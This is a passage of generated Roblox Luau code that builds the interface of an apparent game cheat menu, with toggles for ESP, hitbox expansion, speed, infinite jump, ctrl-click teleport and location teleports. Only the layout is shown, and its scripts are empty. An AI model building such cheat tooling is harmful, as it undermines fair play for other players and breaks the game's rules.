G2L["15"]["Size"] = UDim2.new(0.51425, 0, -0.02655, 23);
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Text"] = [[ENABLE NAMETAGS ESP]];
G2L["15"]["Name"] = [[10]];
G2L["15"]["Position"] = UDim2.new(0.1623, 0, 0.23245, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.BoxEspToggle
G2L["16"] = Instance.new("TextButton", G2L["10"]);
G2L["16"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["TextSize"] = 14;
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16"]["Size"] = UDim2.new(0, 10, 0, 10);
G2L["16"]["Name"] = [[BoxEspToggle]];
G2L["16"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["16"]["Text"] = [[]];
G2L["16"]["Position"] = UDim2.new(0.04869, 0, 0.13068, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.BoxEspToggle.LocalScript
G2L["17"] = Instance.new("LocalScript", G2L["16"]);



-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.GunchamsToggle
G2L["18"] = Instance.new("TextButton", G2L["10"]);
G2L["18"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["TextSize"] = 14;
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18"]["Size"] = UDim2.new(0, 10, 0, 10);
G2L["18"]["Name"] = [[GunchamsToggle]];
G2L["18"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["18"]["Text"] = [[]];
G2L["18"]["Position"] = UDim2.new(0.04869, 0, 0.36962, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.GunchamsToggle.LocalScript
G2L["19"] = Instance.new("LocalScript", G2L["18"]);



-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.12
G2L["1a"] = Instance.new("TextLabel", G2L["10"]);
G2L["1a"]["BorderSizePixel"] = 0;
G2L["1a"]["TextSize"] = 9;
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["1a"]["BackgroundTransparency"] = 1;
G2L["1a"]["Size"] = UDim2.new(0.44553, 0, -0.02655, 23);
G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["Text"] = [[ENABLE GUNCHAMS]];
G2L["1a"]["Name"] = [[12]];
G2L["1a"]["Position"] = UDim2.new(0.15289, 0, 0.35192, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.ChatlogsToggle
G2L["1b"] = Instance.new("TextButton", G2L["10"]);
G2L["1b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["TextSize"] = 14;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b"]["Size"] = UDim2.new(0, 10, 0, 10);
G2L["1b"]["Name"] = [[ChatlogsToggle]];
G2L["1b"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["1b"]["Text"] = [[]];
G2L["1b"]["Position"] = UDim2.new(0.04869, 0, 0.48024, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.ChatlogsToggle.LocalScript
G2L["1c"] = Instance.new("LocalScript", G2L["1b"]);



-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.11
G2L["1d"] = Instance.new("TextLabel", G2L["10"]);
G2L["1d"]["BorderSizePixel"] = 0;
G2L["1d"]["TextSize"] = 9;
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["1d"]["BackgroundTransparency"] = 1;
G2L["1d"]["Size"] = UDim2.new(0.44553, 0, -0.02655, 23);
G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["Text"] = [[ENABLE CHATLOGS]];
G2L["1d"]["Name"] = [[11]];
G2L["1d"]["Position"] = UDim2.new(0.14768, 0, 0.46254, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight
G2L["1e"] = Instance.new("Frame", G2L["a"]);
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["1e"]["Size"] = UDim2.new(0, 192, 0, 226);
G2L["1e"]["Position"] = UDim2.new(0.54726, 0, 0.50862, 0);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["1e"]["Name"] = [[MainBottomRight]];
G2L["1e"]["LayoutOrder"] = 999;


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.CTRLClickTP
G2L["1f"] = Instance.new("TextButton", G2L["1e"]);
G2L["1f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["TextSize"] = 14;
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f"]["Size"] = UDim2.new(0, 10, 0, 10);
G2L["1f"]["Name"] = [[CTRLClickTP]];
G2L["1f"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["1f"]["Text"] = [[]];
G2L["1f"]["Position"] = UDim2.new(0.03727, 0, 0.37701, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.CTRLClickTP.LocalScript
G2L["20"] = Instance.new("LocalScript", G2L["1f"]);



-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.InfiniteJumpToggle
G2L["21"] = Instance.new("TextButton", G2L["1e"]);
G2L["21"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["TextSize"] = 14;
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21"]["Size"] = UDim2.new(0, 10, 0, 10);
G2L["21"]["Name"] = [[InfiniteJumpToggle]];
G2L["21"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["21"]["Text"] = [[]];
G2L["21"]["Position"] = UDim2.new(0.03727, 0, 0.27082, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.InfiniteJumpToggle.LocalScript
G2L["22"] = Instance.new("LocalScript", G2L["21"]);



-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.SpeedToggle
G2L["23"] = Instance.new("TextButton", G2L["1e"]);
G2L["23"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["TextSize"] = 14;
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["23"]["Size"] = UDim2.new(0, 10, 0, 10);
G2L["23"]["Name"] = [[SpeedToggle]];
G2L["23"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["23"]["Text"] = [[]];
G2L["23"]["Position"] = UDim2.new(0.03727, 0, 0.15909, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.SpeedToggle.LocalScript
G2L["24"] = Instance.new("LocalScript", G2L["23"]);



-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.12
G2L["25"] = Instance.new("TextLabel", G2L["1e"]);
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["TextSize"] = 9;
G2L["25"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["25"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["25"]["BackgroundTransparency"] = 1;
G2L["25"]["Size"] = UDim2.new(0.41108, 0, -0.02733, 23);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Text"] = [[ENABLE SPEED]];
G2L["25"]["Name"] = [[12]];
G2L["25"]["Position"] = UDim2.new(0.14286, 0, 0.14243, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.12
G2L["26"] = Instance.new("TextLabel", G2L["1e"]);
G2L["26"]["BorderSizePixel"] = 0;
G2L["26"]["TextSize"] = 9;
G2L["26"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["26"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["26"]["BackgroundTransparency"] = 1;
G2L["26"]["Size"] = UDim2.new(0.75823, 0, -0.02655, 23);
G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26"]["Text"] = [[ENABLE INFINITE JUMP]];
G2L["26"]["Name"] = [[12]];
G2L["26"]["Position"] = UDim2.new(0.14227, 0, 0.25458, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.12
G2L["27"] = Instance.new("TextLabel", G2L["1e"]);
G2L["27"]["BorderSizePixel"] = 0;
G2L["27"]["TextSize"] = 9;
G2L["27"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["27"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["27"]["BackgroundTransparency"] = 1;
G2L["27"]["Size"] = UDim2.new(0.73392, 0, -0.02655, 23);
G2L["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["Text"] = [[ENABLE CTRL CLICK TP]];
G2L["27"]["Name"] = [[12]];
G2L["27"]["Position"] = UDim2.new(0.14286, 0, 0.36077, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.5
G2L["28"] = Instance.new("TextLabel", G2L["1e"]);
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["TextSize"] = 9;
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["28"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["28"]["BackgroundTransparency"] = 1;
G2L["28"]["Size"] = UDim2.new(0.16072, 0, -0.02477, 23);
G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["Text"] = [[movement]];
G2L["28"]["Name"] = [[5]];
G2L["28"]["Position"] = UDim2.new(0.41549, 0, -0.00193, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.OldSpeed
G2L["29"] = Instance.new("TextButton", G2L["1e"]);
G2L["29"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["TextSize"] = 14;
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["29"]["Size"] = UDim2.new(0, 10, 0, 10);
G2L["29"]["Name"] = [[OldSpeed]];
G2L["29"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["29"]["Text"] = [[]];
G2L["29"]["Position"] = UDim2.new(0.03727, 0, 0.47767, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.OldSpeed.LocalScript
G2L["2a"] = Instance.new("LocalScript", G2L["29"]);



-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomRight.12
G2L["2b"] = Instance.new("TextLabel", G2L["1e"]);
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["TextSize"] = 9;
G2L["2b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2b"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["2b"]["BackgroundTransparency"] = 1;
G2L["2b"]["Size"] = UDim2.new(0.65074, 0, -0.02733, 23);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["Text"] = [[ENABLE SPEED (OLD)]];
G2L["2b"]["Name"] = [[12]];
G2L["2b"]["Position"] = UDim2.new(0.14286, 0, 0.46101, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft
G2L["2c"] = Instance.new("Frame", G2L["a"]);
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["2c"]["Size"] = UDim2.new(0, 192, 0, 226);
G2L["2c"]["Position"] = UDim2.new(0.00498, 0, 0.51078, 0);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["2c"]["Name"] = [[MainBottomLeft]];
G2L["2c"]["LayoutOrder"] = 3;


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft.4
G2L["2d"] = Instance.new("TextLabel", G2L["2c"]);
G2L["2d"]["BorderSizePixel"] = 0;
G2L["2d"]["TextSize"] = 9;
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2d"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["2d"]["BackgroundTransparency"] = 1;
G2L["2d"]["Size"] = UDim2.new(0.16072, 0, -0.02477, 23);
G2L["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["Text"] = [[hitbox expander]];
G2L["2d"]["Name"] = [[4]];
G2L["2d"]["Position"] = UDim2.new(0.41437, 0, -0.00193, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft.HitBoxToggle
G2L["2e"] = Instance.new("TextButton", G2L["2c"]);
G2L["2e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["TextSize"] = 14;
G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["2e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2e"]["Size"] = UDim2.new(0, 10, 0, 10);
G2L["2e"]["Name"] = [[HitBoxToggle]];
G2L["2e"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["2e"]["Text"] = [[]];
G2L["2e"]["Position"] = UDim2.new(0.04348, 0, 0.15909, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft.HitBoxToggle.LocalScript
G2L["2f"] = Instance.new("LocalScript", G2L["2e"]);



-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft.11
G2L["30"] = Instance.new("TextLabel", G2L["2c"]);
G2L["30"]["BorderSizePixel"] = 0;
G2L["30"]["TextSize"] = 9;
G2L["30"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["30"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["30"]["BackgroundTransparency"] = 1;
G2L["30"]["Size"] = UDim2.new(0.48133, 0, -0.06944, 23);
G2L["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30"]["Text"] = [[ENABLE HITBOX]];
G2L["30"]["Name"] = [[11]];
G2L["30"]["Position"] = UDim2.new(0.06431, 0, 0.15909, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft.config
G2L["31"] = Instance.new("CanvasGroup", G2L["2c"]);
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["31"]["Size"] = UDim2.new(0, 191, 0, 165);
G2L["31"]["Position"] = UDim2.new(0.00508, 0, 0.26677, 0);
G2L["31"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["31"]["Name"] = [[config]];
G2L["31"]["BackgroundTransparency"] = 1;


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft.config.main
G2L["32"] = Instance.new("Frame", G2L["31"]);
G2L["32"]["BorderSizePixel"] = 0;
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32"]["Size"] = UDim2.new(0.9207, 0, 0.96236, 0);
G2L["32"]["Position"] = UDim2.new(0.0386, 0, 0, 0);
G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["Name"] = [[main]];
G2L["32"]["BackgroundTransparency"] = 1;


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft.config.main.1color
G2L["33"] = Instance.new("TextBox", G2L["32"]);
G2L["33"]["Name"] = [[1color]];
G2L["33"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["33"]["PlaceholderColor3"] = Color3.fromRGB(86, 74, 87);
G2L["33"]["TextSize"] = 9;
G2L["33"]["TextColor3"] = Color3.fromRGB(164, 140, 165);
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["33"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["33"]["PlaceholderText"] = [[Enter Colour Code (HEX ONLY)]];
G2L["33"]["Size"] = UDim2.new(1, 0, 0, 25);
G2L["33"]["Position"] = UDim2.new(0, 0, 0.41571, 0);
G2L["33"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["33"]["Text"] = [[]];


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft.config.main.1color.UIPadding
G2L["34"] = Instance.new("UIPadding", G2L["33"]);
G2L["34"]["PaddingTop"] = UDim.new(0, 5);
G2L["34"]["PaddingRight"] = UDim.new(0, 10);
G2L["34"]["PaddingLeft"] = UDim.new(0, 10);
G2L["34"]["PaddingBottom"] = UDim.new(0, 5);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft.config.main.5save
G2L["35"] = Instance.new("TextButton", G2L["32"]);
G2L["35"]["TextColor3"] = Color3.fromRGB(164, 140, 165);
G2L["35"]["TextSize"] = 12;
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["35"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["35"]["Size"] = UDim2.new(1, 0, -0.0122, 24);
G2L["35"]["Name"] = [[5save]];
G2L["35"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["35"]["Text"] = [[SAVE]];
G2L["35"]["Position"] = UDim2.new(-0.01137, 0, 0.84374, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft.config.main.UIListLayout
G2L["36"] = Instance.new("UIListLayout", G2L["32"]);
G2L["36"]["VerticalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["36"]["Padding"] = UDim.new(0, 5);
G2L["36"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft.config.main.3hitbox
G2L["37"] = Instance.new("TextBox", G2L["32"]);
G2L["37"]["Name"] = [[3hitbox]];
G2L["37"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["37"]["PlaceholderColor3"] = Color3.fromRGB(86, 74, 87);
G2L["37"]["TextSize"] = 9;
G2L["37"]["TextColor3"] = Color3.fromRGB(164, 140, 165);
G2L["37"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["37"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["37"]["PlaceholderText"] = [[Enter HitBox Size]];
G2L["37"]["Size"] = UDim2.new(1, 0, 0, 25);
G2L["37"]["Position"] = UDim2.new(0, 0, 0.65982, 0);
G2L["37"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["37"]["Text"] = [[]];


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft.config.main.3hitbox.UIPadding
G2L["38"] = Instance.new("UIPadding", G2L["37"]);
G2L["38"]["PaddingTop"] = UDim.new(0, 5);
G2L["38"]["PaddingRight"] = UDim.new(0, 10);
G2L["38"]["PaddingLeft"] = UDim.new(0, 10);
G2L["38"]["PaddingBottom"] = UDim.new(0, 5);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft.config.main.4size
G2L["39"] = Instance.new("TextLabel", G2L["32"]);
G2L["39"]["TextWrapped"] = true;
G2L["39"]["BorderSizePixel"] = 0;
G2L["39"]["TextSize"] = 12;
G2L["39"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["39"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["39"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["39"]["BackgroundTransparency"] = 1;
G2L["39"]["Size"] = UDim2.new(1, 0, -0.01503, 23);
G2L["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["39"]["Text"] = [[Size : DEFAULT]];
G2L["39"]["Name"] = [[4size]];


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainBottomLeft.config.main.2ctext
G2L["3a"] = Instance.new("TextLabel", G2L["32"]);
G2L["3a"]["TextWrapped"] = true;
G2L["3a"]["BorderSizePixel"] = 0;
G2L["3a"]["TextSize"] = 12;
G2L["3a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3a"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["3a"]["BackgroundTransparency"] = 1;
G2L["3a"]["Size"] = UDim2.new(1, 0, -0.01503, 23);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["Text"] = [[Color : DEFAULT]];
G2L["3a"]["Name"] = [[2ctext]];


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.UIListLayout
G2L["3b"] = Instance.new("UIListLayout", G2L["a"]);
G2L["3b"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["3b"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["3b"]["Wraps"] = true;
G2L["3b"]["Padding"] = UDim.new(0, 10);
G2L["3b"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["3b"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["3b"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.UIPadding
G2L["3c"] = Instance.new("UIPadding", G2L["a"]);
G2L["3c"]["PaddingTop"] = UDim.new(0, 10);
G2L["3c"]["PaddingRight"] = UDim.new(0, 10);
G2L["3c"]["PaddingLeft"] = UDim.new(0, 10);
G2L["3c"]["PaddingBottom"] = UDim.new(0, 10);


-- StarterGui.MNSGUI.MainNitroFrame.LocalScript
G2L["3d"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame
G2L["3e"] = Instance.new("Frame", G2L["2"]);
G2L["3e"]["Visible"] = false;
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["3e"]["Size"] = UDim2.new(0, 422, 0, 484);
G2L["3e"]["Position"] = UDim2.new(0, 0, 0.11096, 0);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["3e"]["Name"] = [[PlayerlistFrame]];


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft
G2L["3f"] = Instance.new("Frame", G2L["3e"]);
G2L["3f"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["3f"]["Size"] = UDim2.new(0, 394, 0, 462);
G2L["3f"]["Position"] = UDim2.new(0.00995, 0, -0.00108, 0);
G2L["3f"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["3f"]["Name"] = [[PlayerlistLeft]];
G2L["3f"]["LayoutOrder"] = 1;


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame
G2L["40"] = Instance.new("Frame", G2L["3f"]);
G2L["40"]["BorderSizePixel"] = 0;
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["Size"] = UDim2.new(0.93639, 0, -0.22294, 398);
G2L["40"]["Position"] = UDim2.new(0.03076, 0, 0.06667, 0);
G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["BackgroundTransparency"] = 1;


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.park
G2L["41"] = Instance.new("TextButton", G2L["40"]);
G2L["41"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["41"]["TextSize"] = 11;
G2L["41"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["41"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["41"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["41"]["Name"] = [[park]];
G2L["41"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["41"]["Text"] = [[park]];
G2L["41"]["Position"] = UDim2.new(0.34479, 0, 0.06195, 0);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.uphillfood
G2L["42"] = Instance.new("TextButton", G2L["40"]);
G2L["42"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["TextSize"] = 10;
G2L["42"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["42"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["42"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["42"]["Name"] = [[uphillfood]];
G2L["42"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["42"]["Text"] = [[up hill food]];
G2L["42"]["Position"] = UDim2.new(0.01875, 0, 0.23407, 0);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.revolver
G2L["43"] = Instance.new("TextButton", G2L["40"]);
G2L["43"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["43"]["TextSize"] = 11;
G2L["43"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["43"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["43"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["43"]["Name"] = [[revolver]];
G2L["43"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["43"]["Text"] = [[revolver]];
G2L["43"]["Position"] = UDim2.new(0.67083, 0, 0.06195, 0);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.gastation
G2L["44"] = Instance.new("TextButton", G2L["40"]);
G2L["44"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["TextSize"] = 11;
G2L["44"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["44"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["44"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["44"]["Name"] = [[gastation]];
G2L["44"]["BorderColor3"] = Color3.fromRGB(164, 140, 165);
G2L["44"]["Text"] = [[gas station]];
G2L["44"]["Position"] = UDim2.new(0.01875, 0, 0.40619, 0);


-- StarterGui.MNSGUI.MainNitroFrame.PlayerlistFrame.PlayerlistLeft.Frame.hoodkicks
G2L["45"] = Instance.new("TextButton", G2L["40"]);
